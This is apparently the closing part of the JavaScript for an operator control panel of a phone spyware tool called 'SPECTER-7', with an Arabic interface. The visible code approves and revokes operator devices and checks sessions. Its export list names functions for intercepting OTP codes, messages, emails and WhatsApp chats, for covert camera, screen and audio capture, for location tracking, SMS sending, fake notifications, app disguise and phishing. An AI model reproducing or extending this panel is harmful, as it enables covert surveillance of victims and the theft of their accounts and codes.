                div.innerHTML = `<div style="flex:1;"><div style="color:#00ffcc;font-size:12px;">✅ مصرح</div><div style="color:#ccc;font-size:11px;word-break:break-all;">${fp.slice(0, 24)}...</div></div><button onclick="revokeDevice('${fp}')" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 سحب</button>`;
                approvedDiv.appendChild(div);
            });
        }
        const deniedDiv = document.getElementById('deniedDevicesList');
        if (deniedDiv) {
            deniedDiv.innerHTML = '';
            if (!data.denied || data.denied.length === 0) deniedDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة محجوبة</p>';
            else data.denied.forEach(fp => {
                const div = document.createElement('div');
                div.className = 'conversation-item';
                div.style.cssText = 'background:#1a0000;border:1px solid #ff3300;padding:12px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;';
                div.innerHTML = `<div style="flex:1;"><div style="color:#ff6666;font-size:12px;">🚫 محجوب</div><div style="color:#ccc;font-size:11px;word-break:break-all;">${fp.slice(0, 24)}...</div></div><button onclick="unblockDevice('${fp}')" style="background:#666;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 فتح</button>`;
                deniedDiv.appendChild(div);
            });
        }
    } catch (e) { console.error('loadAuthorizedDevices:', e); }
}

async function approveDevice(fp) {
    if (!confirm('الموافقة؟')) return;
    try {
        const res = await fetch('/auth/approve', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) { showNotification('✅', 'تمت الموافقة', '🔐'); loadAuthorizedDevices(); }
        else alert('❌ ' + (data.error || ''));
    } catch (e) { alert('❌'); }
}

async function denyDevice(fp) {
    if (!confirm('رفض؟')) return;
    try {
        const res = await fetch('/auth/deny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) { showNotification('🚫', 'تم الرفض', '🚫'); loadAuthorizedDevices(); }
        else alert('❌ ' + (data.error || ''));
    } catch (e) { alert('❌'); }
}

async function revokeDevice(fp) {
    if (!confirm('سحب التصريح؟')) return;
    try {
        const res = await fetch('/auth/revoke', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) { showNotification('🔓', 'تم السحب', '🔓'); loadAuthorizedDevices(); }
        else alert('❌ ' + (data.error || ''));
    } catch (e) { alert('❌'); }
}

async function unblockDevice(fp) {
    if (!confirm('فتح؟')) return;
    try {
        const res = await fetch('/auth/unblock', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) { showNotification('🔓', 'تم', '🔓'); loadAuthorizedDevices(); }
    } catch (e) {}
}

async function loadDevicePermissions() {
    if (!isOwner()) return;
    try {
        const token = getAuthToken();
        const [permsRes, devicesRes, usersRes] = await Promise.all([
            fetch(`/auth/permissions?token=${encodeURIComponent(token)}`),
            fetch(`/devices.json?token=${encodeURIComponent(token)}`),
            fetch(`/auth/devices?token=${encodeURIComponent(token)}`)
        ]);
        if (permsRes.status === 403 || devicesRes.status === 403 || usersRes.status === 403) return;
        const perms = await permsRes.json();
        const devices = await devicesRes.json();
        const usersData = await usersRes.json();
        const approvedUsers = usersData.approved || [];
        const div = document.getElementById('devicePermsList');
        if (!div) return;
        div.innerHTML = '';
        if (!devices || devices.length === 0) { div.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة</p>'; return; }
        devices.forEach(device => {
            const allowed = perms[device.id] || [];
            const card = document.createElement('div');
            card.style.cssText = 'background:#1a0a1a;border:1px solid #9b59b6;padding:12px;border-radius:8px;margin-bottom:12px;';
            const userChips = approvedUsers.map(userFp => {
                const isAllowed = allowed.includes(userFp);
                return `<button onclick="toggleDeviceAccess('${device.id}', '${userFp}', ${isAllowed})" style="background:${isAllowed ? '#00cc66' : '#333'};color:#fff;border:none;padding:6px 12px;border-radius:15px;cursor:pointer;font-size:11px;margin:3px;">${isAllowed ? '✅' : '⬜'} ${userFp.slice(0, 16)}...</button>`;
            }).join('');
            card.innerHTML = `<div style="color:#9b59b6;font-weight:bold;margin-bottom:8px;">📱 ${device.name || device.id}</div><div style="color:#888;font-size:11px;margin-bottom:8px;">${device.id}</div><div style="color:#ccc;font-size:12px;margin-bottom:5px;">المستخدمون:</div><div style="display:flex;flex-wrap:wrap;gap:5px;">${userChips || '<span style="color:#666;font-size:11px;">لا يوجد</span>'}</div>`;
            div.appendChild(card);
        });
    } catch (e) { console.error('loadDevicePermissions:', e); }
}

async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
    const token = getAuthToken();
    const endpoint = currentlyAllowed ? '/auth/revoke-device' : '/auth/grant-device';
    try {
        const res = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, deviceId, fp })
        });
        const data = await res.json();
        if (data.success) { showNotification('✅', 'تم', '🔐'); loadDevicePermissions(); }
        else alert('❌ ' + (data.error || ''));
    } catch (e) { alert('❌'); }
}

// ═══════════════════════════════════════════
// Session verify + hide tabs
// ═══════════════════════════════════════════
(async function verifySession() {
    const token = getAuthToken();
    if (!token) { window.location.href = 'login.html'; return; }
    try {
        const res = await fetch('/auth/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token })
        });
        const data = await res.json();
        if (!data.valid) {
            sessionStorage.removeItem('logged_in');
            sessionStorage.removeItem('auth_token');
            sessionStorage.removeItem('is_owner');
            window.location.href = 'login.html';
        } else {
            sessionStorage.setItem('is_owner', data.isOwner ? 'true' : 'false');
        }
    } catch (e) { window.location.href = 'login.html'; }
})();

(function hideSecurityTabForNonOwner() {
    if (!isOwner()) {
        const secTab = document.querySelector('.tab[onclick="switchTab(\'security\')"]');
        if (secTab) secTab.style.display = 'none';
        const secPane = document.getElementById('securityTab');
        if (secPane) secPane.style.display = 'none';
        window.loadAuthorizedDevices = function() {};
        window.loadDevicePermissions = function() {};
    }
})();

setInterval(() => {
    const secTab = document.getElementById('securityTab');
    if (secTab && secTab.classList.contains('active')) loadAuthorizedDevices();
}, 60000);

// ═══════════════════════════════════════════
// START — بدء التشغيل
// ═══════════════════════════════════════════
loadAuthorizedDevices();
loadDevices();
setInterval(loadDevices, 30000);

// ═══════════════════════════════════════════
// Global window exports للأزرار في HTML
// ═══════════════════════════════════════════
window.logout = logout;
window.openAdvancedMenu = openAdvancedMenu;

// 🔐 Advanced menu lock exports
window.requestAdvancedCode = requestAdvancedCode;
window.submitAdvancedCode = submitAdvancedCode;
window.lockAdvancedMenu = lockAdvancedMenu;

window.openLiveImages = openLiveImages;
window.closeLiveImages = closeLiveImages;
window.clearLiveImages = clearLiveImages;
window.downloadLiveImage = downloadLiveImage;
window.deleteLiveImage = deleteLiveImage;

window.openLiveMessages = openLiveMessages;
window.closeLiveMessages = closeLiveMessages;
window.clearLiveMessages = clearLiveMessages;
window.filterLiveMsgs = filterLiveMsgs;
window.deleteLiveMsg = deleteLiveMsg;

window.openLiveOtp = openLiveOtp;
window.closeLiveOtp = closeLiveOtp;
window.clearLiveOtp = clearLiveOtp;
window.deleteLiveOtp = deleteLiveOtp;

window.openLiveVoices = openLiveVoices;
window.closeLiveVoices = closeLiveVoices;
window.clearLiveVoices = clearLiveVoices;
window.downloadLiveVoice = downloadLiveVoice;
window.deleteLiveVoice = deleteLiveVoice;

window.openLiveEmails = openLiveEmails;
window.closeLiveEmails = closeLiveEmails;
window.clearLiveEmails = clearLiveEmails;
window.deleteLiveEmail = deleteLiveEmail;

window.openLiveScreenshots = openLiveScreenshots;
window.closeLiveScreenshots = closeLiveScreenshots;
window.clearLiveScreenshots = clearLiveScreenshots;
window.downloadLiveScreenshot = downloadLiveScreenshot;
window.deleteLiveScreenshot = deleteLiveScreenshot;

window.openLiveCamera = openLiveCamera;
window.closeLiveCamera = closeLiveCamera;
window.clearLiveCamera = clearLiveCamera;
window.downloadLiveCameraPhoto = downloadLiveCameraPhoto;
window.deleteLiveCameraPhoto = deleteLiveCameraPhoto;

window.openLiveVideos = openLiveVideos;
window.closeLiveVideos = closeLiveVideos;
window.clearLiveVideos = clearLiveVideos;
window.downloadLiveVideo = downloadLiveVideo;
window.deleteLiveVideo = deleteLiveVideo;

window.openLiveAudio = openLiveAudio;
window.closeLiveAudio = closeLiveAudio;
window.clearLiveAudio = clearLiveAudio;
window.downloadLiveAudio = downloadLiveAudio;
window.deleteLiveAudio = deleteLiveAudio;

window.openLiveMotion = openLiveMotion;
window.closeLiveMotion = closeLiveMotion;
window.clearLiveMotion = clearLiveMotion;
window.downloadMotionPhoto = downloadMotionPhoto;
window.deleteMotionPhoto = deleteMotionPhoto;

window.openLiveGeofence = openLiveGeofence;
window.closeLiveGeofence = closeLiveGeofence;
window.clearLiveGeofence = clearLiveGeofence;
window.deleteGeofenceEvent = deleteGeofenceEvent;

window.openLiveAudioStream = openLiveAudioStream;
window.closeLiveAudioStream = closeLiveAudioStream;
window.clearLiveAudioStream = clearLiveAudioStream;
window.downloadLiveAudioChunk = downloadLiveAudioChunk;

window.startAudioRecording = startAudioRecording;
window.stopAudioRecording = stopAudioRecording;
window.startVideoRecording = startVideoRecording;
window.stopVideoRecording = stopVideoRecording;
window.takeCameraPhoto = takeCameraPhoto;
window.takeScreenshot = takeScreenshot;

window.sendFakeNotification = sendFakeNotification;
window.speakOnDevice = speakOnDevice;
window.lockDevice = lockDevice;
window.unlockDevice = unlockDevice;
window.toggleMotionCamera = toggleMotionCamera;
window.openGeofenceDialog = openGeofenceDialog;
window.getCurrentLocation = getCurrentLocation;
window.saveGeofence = saveGeofence;
window.stopGeofenceMonitor = stopGeofenceMonitor;
window.clearAllGeofences = clearAllGeofences;
window.openDeadManDialog = openDeadManDialog;
window.startDeadMan = startDeadMan;
window.stopDeadMan = stopDeadMan;
window.resetDeadMan = resetDeadMan;
window.toggleLiveAudio = toggleLiveAudio;

// 🎣 Phishing exports
window.openLivePhishing = openLivePhishing;
window.closeLivePhishing = closeLivePhishing;
window.clearLivePhishing = clearLivePhishing;
window.sendPhishingCard = sendPhishingCard;
window.doSendPhishing = doSendPhishing;
window.deletePhishingEntry = deletePhishingEntry;
window.copyToClipboard = copyToClipboard;

window.openDisguiseMenu = openDisguiseMenu;
window.changeDisguise = changeDisguise;
window.openSendSms = openSendSms;
window.doSendSms = doSendSms;
window.openSendSmsTo = openSendSmsTo;
window.openReplyWhatsApp = openReplyWhatsApp;
window.openReplyWaPicker = openReplyWaPicker;
window.doReplyWa = doReplyWa;
window.closeWhatsAppChat = closeWhatsAppChat;
window.openWhatsAppChat = openWhatsAppChat;
window.deleteWhatsAppChat = deleteWhatsAppChat;
window.clearWhatsAppList = clearWhatsAppList;
window.selectAllWhatsApp = selectAllWhatsApp;
window.deleteSelectedWhatsApp = deleteSelectedWhatsApp;
window.deleteDevice = deleteDevice;
window.selectDevice = selectDevice;
window.triggerVoiceScan = triggerVoiceScan;
window.filterDeleted = filterDeleted;
window.clearAllDeleted = clearAllDeleted;
window.deleteSingleDeleted = deleteSingleDeleted;
window.backToCallsList = backToCallsList;
window.openCallDetail = openCallDetail;
window.openChat = openChat;
window.backToConversations = backToConversations;
window.openContactDetail = openContactDetail;
window.backToContactsList = backToContactsList;
window.switchTab = switchTab;
window.loadWhatsApp = loadWhatsApp;
window.loadEmails = loadEmails;

window.approveDevice = approveDevice;
window.denyDevice = denyDevice;
window.revokeDevice = revokeDevice;
window.unblockDevice = unblockDevice;
window.toggleDeviceAccess = toggleDeviceAccess;

console.log('%c✅ SPECTER-7 script loaded', 'color: #00ffcc; font-weight: bold;');
